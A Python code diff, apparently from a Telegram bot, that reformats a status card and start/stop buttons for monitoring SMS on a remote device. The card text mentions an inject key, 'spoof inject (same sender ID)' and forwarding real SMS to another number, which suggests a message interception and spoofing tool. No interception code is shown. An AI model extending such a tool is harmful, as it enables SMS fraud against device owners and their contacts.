@@ -567,37 +567,52 @@ def format_monitoring_card(
     *,
     startup_test_sent: bool = False,
 ) -> str:
+    from app.services import display_phone, resolve_mynum_phone
+
     sim_index = profile.selected_sim_index or 0
     active_sim = get_selected_sim(device, sim_index)
     sim_slot = active_sim.get("slot", 1)
+    sim_number = active_sim.get("number")
+    if _is_valid_sim_number(sim_number):
+        sim_suffix = display_phone(str(sim_number))
+    else:
+        sim_suffix = "Unknown"
     auto_stop = profile.auto_stop_minutes or 15
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
     channel = profile.channel_id or "—"
+    mynum = resolve_mynum_phone(profile) or profile.phone_number
+    real_sms = display_phone(mynum) if mynum else "—"
+    device_tail = _device_phone_display(device)
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring Started! &lt;/&gt;\n"
-        f"📱 Device: {short_device_id(device.name)}\n"
-        f"📡 Device: {format_device_online(device)} (Firebase live)\n"
-        f"📶 FROM SIM: {sim_slot}\n"
+        "Monitoring Started!\n"
+        f"📱 Device: {short_device_id(device.name)} | {device_tail}\n"
+        f"📶 FROM SIM: {sim_slot} ({sim_suffix})\n"
         f"🔑 Inject Key: {inject_key}\n"
-        "📥 Incoming -&gt; spoof inject (same sender ID)\n"
-        f"📢 Channel: {channel} (last / addchannel only)\n"
+        "📩 Incoming -&gt; spoof inject (same sender ID)\n"
+        f"📞 Real SMS -&gt; {real_sms}\n"
+        f"📢 Channel: {channel} (last /addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
+        f"🗃️ Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
         f"{test_line}"
         "</pre>"
     )
 
 
-def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
+def monitoring_keyboard(
+    device: Device | None = None,
+    *,
+    monitoring_active: bool = False,
+) -> InlineKeyboardMarkup:
     start_data = f"monitor:start:{device.id}" if device else "monitor:on"
+    start_label = "🟢 Monitoring ON..." if monitoring_active else "🟢 START Monitoring"
     return InlineKeyboardMarkup(
         [
             [
-                InlineKeyboardButton("🟢 START Monitoring", callback_data=start_data),
+                InlineKeyboardButton(start_label, callback_data=start_data),
                 InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
             ]
         ]
